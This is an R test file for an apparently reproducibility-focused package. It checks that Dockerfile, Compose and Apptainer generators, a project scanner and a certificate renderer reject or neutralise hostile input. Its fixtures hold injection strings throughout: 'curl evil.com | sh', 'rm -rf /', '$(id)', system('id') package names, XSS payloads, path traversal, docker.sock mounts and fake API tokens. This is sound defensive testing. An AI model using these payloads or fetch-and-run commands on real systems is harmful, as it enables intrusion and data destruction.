# Adversarial security, confinement, supply-chain, crypto, XSS, and accuracy tests

test_that("compile_dockerfile blocks shell, newline, label, version, package, and sysreq injections", {
  dir <- make_analysis_fixture()
  sc <- scan_project(dir)

  # 1. Version / base_image / digest / cran_repo injection
  expect_error(compile_dockerfile(sc, r_version = "4.4.1\nRUN curl evil.com | sh"), "control character|Invalid")
  expect_error(compile_dockerfile(sc, base_image = "rocker/r-ver:4.4.1; id"), "Invalid or unsafe")
  expect_error(compile_dockerfile(sc, base_digest = "sha256:nothex;id"), "Invalid SHA-256")
  expect_error(compile_dockerfile(sc, quarto_version = "1.5.57$(id)"), "Invalid version")
  expect_error(compile_dockerfile(sc, cmdstan_version = "2.35.0'; system('id'); '"), "Invalid version")
  expect_error(compile_dockerfile(sc, cran_repo = "https://cran.r-project.org; rm -rf /"), "Invalid or unsafe")

  # 2. User / root / workdir / entrypoint injection
  expect_error(compile_dockerfile(sc, user = "root"), "cannot be")
  expect_error(compile_dockerfile(sc, user = "capsule && id"), "Invalid Linux username")
  expect_error(compile_dockerfile(sc, workdir = "/capsule; rm -rf /"), "Invalid or unsafe container path")
  expect_error(compile_dockerfile(sc, workdir = "/capsule/../etc"), "Invalid or unsafe container path")
  expect_error(compile_dockerfile(sc, entrypoint = "run.R\"; id #"), "Unsafe shell/metacharacter")
  expect_error(compile_dockerfile(sc, entrypoint = "../../etc/passwd"), "Path traversal")
  expect_error(compile_dockerfile(sc, entrypoint = "run.R\nRUN pwn"), "control character")

  # 3. Malicious apt sysreqs via custom_sysreqs
  expect_error(
    resolve_sysreqs("dplyr", custom_sysreqs = list(dplyr = "curl && curl evil.com | sh")),
    "Invalid or unsafe apt"
  )
  expect_error(
    resolve_sysreqs("dplyr", custom_sysreqs = list(dplyr = "curl\nRUN id")),
    "Invalid or unsafe apt"
  )

  # 4. Malicious R package name injected into scan object or renv.lock
  sc_bad_pkg <- sc
  sc_bad_pkg$packages$package[[1L]] <- "dplyr'), system('id'), c('x"
  expect_error(compile_dockerfile(sc_bad_pkg), "Invalid or unsafe R package")

  # 5. Malicious Python package spec injected into scan object (when no requirements.txt)
  sc_bad_py <- sc
  sc_bad_py$toolchains$python$detected <- TRUE
  sc_bad_py$python_packages <- c("numpy; $(id)")
  expect_error(compile_dockerfile(sc_bad_py), "Invalid or unsafe Python package")

  # 6. Crafted project_name with quotes & newlines is safely sanitized in comments & LABEL
  sc_evil_name <- sc
  sc_evil_name$project_name <- "study\"\nRUN curl evil.com | sh\n#"
  df_safe <- compile_dockerfile(sc_evil_name)
  expect_false(any(grepl("^RUN curl evil", df_safe$lines)))
  expect_true(lint_container_spec(df_safe)$passed)
})

test_that("compile_compose blocks YAML comment injection, unsafe env vars, volumes, and service names", {
  dir <- make_shiny_fixture()
  sc <- scan_project(dir)

  # Header newline YAML injection neutralized
  sc_yaml_inj <- sc
  sc_yaml_inj$project_name <- "app\nservices:\n  evil:\n    image: alpine:latest\n    privileged: true"
  comp <- compile_compose(sc_yaml_inj)
  expect_false("evil" %in% names(comp$config$services))
  expect_true(lint_container_spec(comp)$passed)

  # Service name, tag, dockerfile, proxy, resource, env, volume injections blocked
  expect_error(compile_compose(sc, service_name = "app:\n  privileged: true"), "control character|Invalid")
  expect_error(compile_compose(sc, image_tag = "1.0\nprivileged: true"), "control character|Invalid")
  expect_error(compile_compose(sc, dockerfile = "../../Dockerfile"), "Path traversal")
  expect_error(compile_compose(sc, proxy_image = "caddy:2.8.4; id"), "Invalid or unsafe")
  expect_error(compile_compose(sc, cpus = "2; id"), "positive numeric")
  expect_error(compile_compose(sc, memory_limit = "2G\n  privileged: true"), "control character")
  expect_error(compile_compose(sc, restart_policy = "always; id"), "must be one of")
  expect_error(compile_compose(sc, env_vars = list("BAD NAME" = "1")), "Invalid environment variable name")
  expect_error(compile_compose(sc, env_vars = list(FOO = "bar\n  privileged: true")), "control character")
  expect_error(compile_compose(sc, volumes = "/var/run/docker.sock:/var/run/docker.sock"), "Dangerous host volume")
  expect_error(compile_compose(sc, volumes = "/:/host:rw"), "Dangerous host volume")
  expect_error(compile_compose(sc, volumes = "../../../etc:/mnt:ro"), "Path traversal")
})

test_that("compile_apptainer blocks %post section breakout, shell injection, and malicious renv.lock/DESCRIPTION", {
  dir <- make_analysis_fixture()
  sc <- scan_project(dir)

  # %labels newline -> %post breakout neutralized (single %post only, no injected curl command)
  sc_ap_inj <- sc
  sc_ap_inj$project_name <- "study\n%post\n    curl evil.com | sh"
  def <- compile_apptainer(sc_ap_inj)
  expect_equal(sum(trimws(def$lines) == "%post"), 1L)
  expect_false(any(grepl("^\\s*curl\\s+evil\\.com", def$lines)))
  expect_true(lint_container_spec(def)$passed)

  # Leading % in project name neutralized in %labels
  sc_pct <- sc
  sc_pct$project_name <- "%post"
  def_pct <- compile_apptainer(sc_pct)
  expect_equal(sum(trimws(def_pct$lines) == "%post"), 1L)

  # Crafted renv.lock with malicious package name rejected at scan time
  evil_dir <- withr::local_tempdir()
  jsonlite::write_json(
    list(
      R = list(Version = "4.4.1"),
      Packages = list(
        bad = list(Package = "dplyr'); system('id'); ('x", Version = "1.0.0", Source = "Repository")
      )
    ),
    file.path(evil_dir, "renv.lock"),
    auto_unbox = TRUE
  )
  expect_error(scan_project(evil_dir), "Invalid or unsafe R package")

  # Crafted renv.lock with malicious R version rejected
  evil_ver <- withr::local_tempdir()
  jsonlite::write_json(
    list(R = list(Version = "4.4.1\nRUN pwn"), Packages = list()),
    file.path(evil_ver, "renv.lock"),
    auto_unbox = TRUE
  )
  expect_error(scan_project(evil_ver), "control character|Invalid version")

  # YAML !expr execution disabled in _quarto.yml and notebook frontmatter
  yaml_dir <- withr::local_tempdir()
  sentinel <- file.path(yaml_dir, "pwned.txt")
  writeLines(
    c(
      "project:",
      sprintf("  type: !expr writeLines('pwned', '%s')", sentinel)
    ),
    file.path(yaml_dir, "_quarto.yml")
  )
  sc_yaml <- scan_project(yaml_dir)
  expect_false(file.exists(sentinel))
})

test_that("path-traversal and symlink-escape confinement holds across scan, manifest, and verify", {
  parent <- withr::local_tempdir()
  proj <- file.path(parent, "project")
  outside <- file.path(parent, "outside_secret")
  dir.create(proj)
  dir.create(outside)

  secret_file <- file.path(outside, "secret.R")
  writeLines("library(secretoutsidepkg)\n# sensitive host file", secret_file)
  outside_data <- file.path(outside, "host_data.csv")
  write.csv(data.frame(k = 1), outside_data, row.names = FALSE)

  writeLines(
    c("write.csv(data.frame(x = 1:2), 'out.csv', row.names = FALSE)"),
    file.path(proj, "run.R")
  )
  write.csv(data.frame(x = 1:2), file.path(proj, "out.csv"), row.names = FALSE)

  # Create symlink inside project pointing outside project root
  link_path <- file.path(proj, "escape_link.R")
  fs::link_create(secret_file, link_path)

  # 1. scan_project skips external symlink and never parses its packages
  sc <- scan_project(proj)
  expect_false("secretoutsidepkg" %in% sc$packages$package)
  expect_false("escape_link.R" %in% sc$files$path)
  expect_true("escape_link.R" %in% sc$skipped_external_symlinks)

  # 2. create_capsule_manifest rejects .., external absolute path, and external symlinks
  expect_error(
    create_capsule_manifest(proj, inputs = "../outside_secret/host_data.csv"),
    "Path traversal"
  )
  expect_error(
    create_capsule_manifest(proj, inputs = outside_data),
    "escapes project root|outside project root"
  )
  expect_error(
    create_capsule_manifest(proj, inputs = "escape_link.R"),
    "escapes project root"
  )

  # 3. verify_capsule rejects crafted manifest with traversal paths in entrypoint/inputs/outputs
  m <- create_capsule_manifest(proj, outputs = "out.csv", seed = 1L)

  m_trav_out <- m
  m_trav_out$artifacts$outputs[[1L]]$path <- "../../outside_secret/host_data.csv"
  expect_error(verify_capsule(m_trav_out, path = proj), "Path traversal")

  m_trav_ep <- m
  m_trav_ep$project$entrypoint <- "../outside_secret/secret.R"
  expect_error(verify_capsule(m_trav_ep, path = proj), "Path traversal")

  m_abs_in <- m
  m_abs_in$artifacts$inputs <- list(list(path = outside_data, sha256 = "abc", bytes = 1L, format = "csv"))
  expect_error(verify_capsule(m_abs_in, path = proj), "Unsafe non-relative path")
})

test_that("verify_capsule scrubs ambient secret env vars from isolated sandbox and detects extra artifacts", {
  dir <- withr::local_tempdir()
  writeLines(
    c(
      "leaked <- c(",
      "  AWS_SECRET_ACCESS_KEY = Sys.getenv('AWS_SECRET_ACCESS_KEY', ''),",
      "  GITHUB_TOKEN = Sys.getenv('GITHUB_TOKEN', ''),",
      "  GH_TOKEN = Sys.getenv('GH_TOKEN', ''),",
      "  OPENAI_API_KEY = Sys.getenv('OPENAI_API_KEY', ''),",
      "  ANTHROPIC_API_KEY = Sys.getenv('ANTHROPIC_API_KEY', ''),",
      "  CUSTOM_MY_SECRET_VAL = Sys.getenv('CUSTOM_MY_SECRET_VAL', ''),",
      "  EXPLICIT_OK = Sys.getenv('EXPLICIT_OK', '')",
      ")",
      "jsonlite::write_json(as.list(leaked), 'env_audit.json', auto_unbox = TRUE)",
      "if (identical(Sys.getenv('DROP_EXTRA', '0'), '1')) writeLines('surprise', 'unexpected_extra.txt')"
    ),
    file.path(dir, "run.R")
  )

  # Baseline run with empty secrets
  baseline <- list(
    AWS_SECRET_ACCESS_KEY = "",
    GITHUB_TOKEN = "",
    GH_TOKEN = "",
    OPENAI_API_KEY = "",
    ANTHROPIC_API_KEY = "",
    CUSTOM_MY_SECRET_VAL = "",
    EXPLICIT_OK = "safe-value"
  )
  jsonlite::write_json(baseline, file.path(dir, "env_audit.json"), auto_unbox = TRUE)

  m <- create_capsule_manifest(dir, outputs = "env_audit.json", seed = 7L)

  # Inject live ambient secrets into current R session; verify sandbox scrubs ALL of them!
  withr::local_envvar(c(
    AWS_SECRET_ACCESS_KEY = "AKIA_FAKE_AWS_SECRET",
    GITHUB_TOKEN = "ghp_fake_github_token",
    GH_TOKEN = "gho_fake_gh_token",
    OPENAI_API_KEY = "sk-fake-openai-key",
    ANTHROPIC_API_KEY = "sk-ant-fake-anthropic-key",
    CUSTOM_MY_SECRET_VAL = "top-secret-value"
  ))

  v <- verify_capsule(
    m,
    path = dir,
    runner = "sandbox",
    env_vars = list(EXPLICIT_OK = "safe-value"),
    scrub_secrets = TRUE
  )
  expect_true(v$passed)
  expect_equal(v$status, "verified_exact")
  expect_true(all(c(
    "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "GH_TOKEN",
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "CUSTOM_MY_SECRET_VAL"
  ) %in% v$scrubbed_env_vars))
  expect_equal(v$extra_artifacts, character())

  # Detect unexpected extra artifacts created during execution
  v_extra_warn <- verify_capsule(
    m,
    path = dir,
    runner = "sandbox",
    env_vars = list(EXPLICIT_OK = "safe-value", DROP_EXTRA = "1"),
    strict_outputs = FALSE
  )
  expect_true(v_extra_warn$passed)
  expect_equal(v_extra_warn$extra_artifacts, "unexpected_extra.txt")

  v_extra_fail <- verify_capsule(
    m,
    path = dir,
    runner = "sandbox",
    env_vars = list(EXPLICIT_OK = "safe-value", DROP_EXTRA = "1"),
    strict_outputs = TRUE
  )
  expect_false(v_extra_fail$passed)
  expect_equal(v_extra_fail$status, "failed")
  expect_match(paste(v_extra_fail$failure_reasons, collapse = " "), "Unexpected extra output artifact")
})

test_that("render_certificate strictly escapes XSS payloads across all dynamic fields and sets CSP", {
  dir <- make_runnable_pipeline_fixture(seed = 21L)
  m <- create_capsule_manifest(dir, inputs = "data/input.csv", outputs = "results/summary.csv", seed = 21L)
  v <- verify_capsule(m, path = dir)

  xss <- "<script>alert('xss')</script><img src=x onerror=alert(1)>"
  # Inject XSS into every dynamic field including htmltools::HTML-classed title
  v_evil <- v
  v_evil$manifest$project$name <- xss
  v_evil$manifest$project$git$is_repo <- TRUE
  v_evil$manifest$project$git$branch <- paste0("feat/", xss)
  v_evil$manifest$project$git$commit <- paste0("deadbeef", xss)
  v_evil$output_checks$details[[1L]] <- paste0("Diff detail: ", xss)
  v_evil$failure_reasons <- c(paste0("Failure: ", xss))
  v_evil$extra_artifacts <- c(paste0("extra_", xss, ".csv"))
  v_evil$stdout <- paste0("log output: ", xss)

  cert <- render_certificate(v_evil, format = "both", title = htmltools::HTML(xss))

  # Zero unescaped <script> or <img tags anywhere in HTML or Markdown!
  expect_false(grepl("<script>", cert$html, fixed = TRUE))
  expect_false(grepl("<img ", cert$html, fixed = TRUE))
  expect_match(cert$html, "&lt;script&gt;alert", fixed = TRUE)
  expect_match(cert$html, "Content-Security-Policy", fixed = TRUE)
  expect_match(cert$html, "default-src 'none'", fixed = TRUE)

  expect_false(grepl("<script>", cert$markdown, fixed = TRUE))
  expect_false(grepl("<img ", cert$markdown, fixed = TRUE))
  expect_match(cert$markdown, "&lt;script&gt;", fixed = TRUE)
})

test_that("constant-time comparison and canonical UTF-8 key-ordered manifest digests work properly", {
  # Constant-time equality checks including different lengths and UTF-8 strings
  expect_true(rcapsule:::constant_time_equal("abcdef", "abcdef"))
  expect_false(rcapsule:::constant_time_equal("abcdef", "abcdeg"))
  expect_false(rcapsule:::constant_time_equal("short", "muchlongerstring"))
  expect_false(rcapsule:::constant_time_equal("abc", NA_character_))
  expect_true(rcapsule:::constant_time_equal("caf\u00e9", "caf\u00e9"))

  # Canonical JSON digest is invariant to JSON key reordering on disk
  dir <- make_runnable_pipeline_fixture(seed = 33L)
  m_path <- file.path(dir, "capsule.json")
  m <- create_capsule_manifest(
    dir,
    inputs = "data/input.csv",
    outputs = "results/summary.csv",
    seed = 33L,
    metadata = list(zeta = "caf\u00e9", alpha = 1L),
    key = "hmac-key-utf8-\u00e9",
    output = m_path
  )

  # Manually reverse metadata keys in JSON on disk; canonical digest & HMAC must STILL verify!
  raw_obj <- jsonlite::read_json(m_path, simplifyVector = FALSE)
  raw_obj$metadata <- list(alpha = 1L, zeta = "caf\u00e9")
  raw_obj$project <- rev(raw_obj$project)
  reordered_path <- file.path(dir, "capsule_reordered.json")
  writeLines(jsonlite::toJSON(raw_obj, auto_unbox = TRUE, null = "null", digits = NA, pretty = TRUE), reordered_path)

  chk <- verify_manifest_integrity(reordered_path, key = "hmac-key-utf8-\u00e9")
  expect_true(chk$valid)
  expect_true(chk$content_valid)
  expect_true(chk$signature_valid)
})

test_that("scan_project AST accurately detects pacman, xfun, box::use, inline R, and non-CRAN renv without false positives", {
  dir <- withr::local_tempdir()
  writeLines(
    c(
      "# library(fake_comment_pkg)",
      "msg1 <- 'library(fake_string_pkg)'",
      "msg2 <- \"fakestring::should_not_detect()\"",
      "pacman::p_load(dplyr, 'tidyr', char = c('purrr'), install = FALSE)",
      "pacman::p_load_gh('stan-dev/cmdstanr@v0.8.1')",
      "xfun::pkg_attach('xml2', c('curl', 'ragg'))",
      "xfun::pkg_load2('haven')",
      "box::use(ggplot2[ggplot, aes], scales, ./local_helper, ../parent_helper)",
      "if (requireNamespace('jsonlite', quietly = TRUE)) invisible(NULL)"
    ),
    file.path(dir, "advanced.R")
  )

  writeLines(
    c(
      "---",
      "title: 'AST Precision Test'",
      "---",
      "",
      "Real inline expression: `r stringr::str_trim(' ok ')`.",
      "Verbatim span should be ignored: `` `r fakeinline::nope()` ``.",
      "",
      "```markdown",
      "Plain fence should be ignored: `r plainfence::nope()`",
      "```",
      "",
      "```{r}",
      "x <- 'fakechunkstr::nope()'",
      "tibble::tibble(a = 1)",
      "```"
    ),
    file.path(dir, "doc.qmd")
  )

  jsonlite::write_json(
    list(
      R = list(Version = "4.4.1"),
      Packages = list(
        myghpkg = list(
          Package = "myghpkg", Version = "0.3.0", Source = "GitHub",
          RemoteType = "github", RemoteUsername = "org", RemoteRepo = "myghpkg", RemoteRef = "main"
        ),
        Biobase = list(
          Package = "Biobase", Version = "2.64.0", Source = "Bioconductor"
        ),
        dplyr = list(
          Package = "dplyr", Version = "1.1.4", Source = "Repository", Repository = "CRAN"
        )
      )
    ),
    file.path(dir, "renv.lock"),
    auto_unbox = TRUE,
    pretty = TRUE
  )

  sc <- scan_project(dir)
  pkgs <- sc$packages$package

  # All true positives detected
  expect_true(all(c(
    "pacman", "dplyr", "tidyr", "purrr", "cmdstanr",
    "xfun", "xml2", "curl", "ragg", "haven",
    "box", "ggplot2", "scales", "jsonlite",
    "stringr", "tibble", "myghpkg", "Biobase"
  ) %in% pkgs))

  # Zero false positives from comments, string literals, relative box modules, verbatim spans, or plain fences
  expect_false(any(c(
    "fake_comment_pkg", "fake_string_pkg", "fakestring",
    "fakeinline", "plainfence", "fakechunkstr",
    "local_helper", "parent_helper"
  ) %in% pkgs))

  # Non-CRAN renv provenance preserved
  expect_true(all(c("myghpkg", "Biobase") %in% sc$non_cran_packages))
  expect_false("dplyr" %in% sc$non_cran_packages)
  expect_match(sc$packages$source[sc$packages$package == "myghpkg"], "GitHub \\(org/myghpkg@main\\)")
  expect_match(sc$packages$source[sc$packages$package == "Biobase"], "Bioconductor")

  # Even syntactically broken R scripts do NOT trigger string-literal :: false positives
  dir_broken <- withr::local_tempdir()
  writeLines(c("s <- 'notapkg::nope()'", "x <- realpkg::fn(1"), file.path(dir_broken, "broken.R"))
  sc_b <- scan_project(dir_broken)
  expect_true("realpkg" %in% sc_b$packages$package)
  expect_false("notapkg" %in% sc_b$packages$package)
})

test_that("compare_artifacts supports atol/rtol, nested JSON/RDS, matrices, NA/NaN/Inf, and row/col diagnostics", {
  tmp <- withr::local_tempdir()

  # Deeply nested RDS with matrices, data frames, NA/NaN/Inf, and lists
  obj1 <- list(
    meta = list(model = "hmc", chains = 4L),
    coef_mat = matrix(c(1.0, 2.0, NA_real_, Inf, -Inf, NaN), nrow = 2, ncol = 3,
                      dimnames = list(c("r1", "r2"), c("c1", "c2", "c3"))),
    nested = list(
      tbl = data.frame(id = c("a", "b"), est = c(10.0, 100.0), stringsAsFactors = FALSE),
      vec = c(0.001, 1e4)
    )
  )
  obj2 <- obj1
  obj2$coef_mat[2, 1] <- 2.0005
  obj2$nested$tbl$est <- c(10.002, 100.05)
  obj2$nested$vec <- c(0.00105, 10004.0)

  r1 <- file.path(tmp, "deep1.rds")
  r2 <- file.path(tmp, "deep2.rds")
  saveRDS(obj1, r1)
  saveRDS(obj2, r2)

  # Passes with atol + rtol aliases (abs_tol handles small values, rel_tol handles 1e4 scale)
  res_ok <- compare_artifacts(r1, r2, atol = 1e-3, rtol = 1e-3)
  expect_true(res_ok$passed)
  expect_equal(res_ok$status, "within_tolerance")

  # NA vs finite mismatch caught distinctly with [row,col] coordinate
  obj_na <- obj1
  obj_na$coef_mat[1, 2] <- 2.0
  r_na <- file.path(tmp, "bad_na.rds")
  saveRDS(obj_na, r_na)
  res_na <- compare_artifacts(r1, r_na, atol = 1e-2)
  expect_false(res_na$passed)
  expect_match(res_na$details, "coef_mat\\[1,2\\]: NA mismatch")

  # Matrix mismatch reports exact [row,col] coordinates
  obj_bad_mat <- obj1
  obj_bad_mat$coef_mat[2, 1] <- 9.99
  r_mat <- file.path(tmp, "bad_mat.rds")
  saveRDS(obj_bad_mat, r_mat)
  res_mat <- compare_artifacts(r1, r_mat, atol = 1e-3, rtol = 1e-3)
  expect_false(res_mat$passed)
  expect_match(res_mat$details, "coef_mat\\[2,1\\]")

  # NA vs NaN mismatch caught distinctly
  obj_nan <- obj1
  obj_nan$coef_mat[1, 2] <- NaN
  r_nan <- file.path(tmp, "bad_nan.rds")
  saveRDS(obj_nan, r_nan)
  res_nan <- compare_artifacts(r1, r_nan, atol = 1e-2)
  expect_false(res_nan$passed)
  expect_match(res_nan$details, "NaN mismatch")

  # Reordered JSON keys + nested numeric tolerance passes
  j1 <- file.path(tmp, "nested1.json")
  j2 <- file.path(tmp, "nested2.json")
  writeLines('{"b": {"y": 100.0, "x": 1.0}, "a": [1.0, 2.0]}', j1)
  writeLines('{"a": [1.0001, 2.0], "b": {"x": 1.0002, "y": 100.04}}', j2)
  res_j <- compare_artifacts(j1, j2, atol = 1e-3, rtol = 1e-3)
  expect_true(res_j$passed)
  expect_equal(res_j$status, "within_tolerance")

  # Missing/extra CSV column and row count diagnostics
  c1 <- file.path(tmp, "t1.csv")
  c2 <- file.path(tmp, "t2.csv")
  c3 <- file.path(tmp, "t3.csv")
  write.csv(data.frame(a = 1:3, b = 4:6), c1, row.names = FALSE)
  write.csv(data.frame(a = 1:2, b = 4:5), c2, row.names = FALSE)
  write.csv(data.frame(a = 1:3, z = 4:6), c3, row.names = FALSE)
  expect_match(compare_artifacts(c1, c2, atol = 1)$details, "row count mismatch")
  expect_match(compare_artifacts(c1, c3, atol = 1)$details, "missing columns: b; extra columns: z")

  # Negative tolerances rejected
  expect_error(compare_artifacts(c1, c1, atol = -1), "non-negative")
})

test_that("lint_container_spec detects curl|sh, network_mode host, docker.sock, space-separated ENV secrets, and Apptainer checks", {
  # Dockerfile: DF011 (curl|sh) and DF008 (space-separated ENV secret + AWS/OPENAI keys)
  df_bad <- c(
    "FROM rocker/r-ver:4.4.1",
    "ENV OPENAI_API_KEY sk-live-1234567890",
    "ARG AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI",
    "RUN curl -fsSL https://example.com/install.sh | bash",
    "USER capsule",
    "WORKDIR /capsule",
    "HEALTHCHECK CMD Rscript -e 'quit(status=0)'"
  )
  ldf <- lint_container_spec(df_bad, type = "dockerfile")
  expect_false(ldf$passed)
  expect_true(all(c("DF008", "DF011") %in% ldf$issues$rule_id))

  # Compose: DC008 (network_mode: host) and DC009 (docker.sock mount)
  comp_bad <- c(
    "services:",
    "  app:",
    "    image: rocker/r-ver:4.4.1",
    "    network_mode: host",
    "    volumes:",
    "      - /var/run/docker.sock:/var/run/docker.sock",
    "    environment:",
    "      - GITHUB_TOKEN=ghp_hardcoded123",
    "    security_opt:",
    "      - no-new-privileges:true",
    "    healthcheck:",
    "      test: ['CMD', 'true']"
  )
  lc <- lint_container_spec(comp_bad, type = "compose")
  expect_false(lc$passed)
  expect_true(all(c("DC006", "DC008", "DC009") %in% lc$issues$rule_id))

  # Apptainer: AP007 (curl|sh) and AP008 (missing --no-install-recommends)
  ap_bad <- c(
    "Bootstrap: docker",
    "From: rocker/r-ver:4.4.1",
    "%labels",
    "    Project demo",
    "%environment",
    "    export TZ=UTC",
    "%post",
    "    set -euo pipefail",
    "    apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*",
    "    curl -fsSL https://example.com/setup.sh | sh",
    "%runscript",
    "    exec R",
    "%test",
    "    R --version"
  )
  la <- lint_container_spec(ap_bad, type = "apptainer")
  expect_false(la$passed)
  expect_true(all(c("AP007", "AP008") %in% la$issues$rule_id))
})
